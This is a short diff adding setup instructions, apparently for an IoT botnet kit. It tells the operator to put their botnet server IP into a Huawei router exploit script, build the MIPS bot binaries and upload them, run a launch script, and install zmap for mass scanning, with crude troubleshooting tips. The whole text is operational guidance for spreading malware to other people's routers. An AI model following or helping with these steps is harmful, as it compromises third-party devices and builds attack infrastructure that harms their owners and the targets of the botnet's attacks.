@@ -1,0 +1,9 @@
+1: Open (huawei.py) and edit the (SERVER IP) to your botnet ip.
+2: Edit the mips named elf to whatever your mips are named in your cross compiler.
+3: Upload the files to your server and do (sh h.sh)
+ 
+ERROR FIXES:
+If it says no command zmap found well install zmap dumbass.
+If youre using centos use the zmap.sh file on my pastebin.
+If youre using anything other than centos do apt-get install zmap -y
+If not work nothing of that run on centos: yum install zmap -y
